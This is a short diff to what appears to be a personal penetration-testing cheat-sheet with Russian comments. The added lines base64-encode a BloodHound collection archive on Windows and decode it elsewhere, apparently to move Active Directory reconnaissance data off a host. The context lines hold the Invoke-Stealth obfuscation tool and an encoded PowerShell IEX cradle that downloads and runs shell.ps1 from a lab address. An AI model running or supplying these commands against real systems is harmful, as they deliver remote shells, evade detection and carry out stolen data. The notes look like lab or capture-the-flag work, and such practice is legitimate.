@@ -45,6 +45,12 @@ exit
 
     sudo pwsh Invoke-Stealth.ps1
 
+# Кодируем в виндовс файл в base64
+
+[convert]::ToBase64String((Get-content -path 20240604191524_BloodHound.zip -Encoding byte))   -----> vim sharp.zip.b64
+
+cat sharp.zip.b64 | base64 -d > sharp_r.zip
+
 # Кодируем скрипт в базе64 utf16 и запускаем
 
 echo -n "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.3/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
